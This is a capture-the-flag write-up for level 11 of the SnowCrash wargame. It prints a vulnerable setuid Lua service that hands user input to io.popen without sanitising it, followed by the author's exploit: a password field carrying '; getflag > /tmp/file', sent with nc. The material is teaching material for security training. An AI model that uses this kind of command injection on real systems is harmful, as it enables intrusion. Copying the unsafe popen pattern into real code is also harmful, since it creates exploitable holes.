```bash
level11@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout*
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
-r-x------  1 level11 level11  675 Apr  3  2012 .profile*
```

```
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Ok so by seeing this we can understand that finding the correct password won't be of any use (in case you can check on internet the password is : "NotSoEasy")
So we understand that we have to do an injection within the popen
let's try the MOST BASIC COMMAND EVER
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/file
Erf nope..
level11@SnowCrash:~$ cat /tmp/file
Check flag.Here is your token : <hidden>
```
Are we being serious right now ?
GG go next
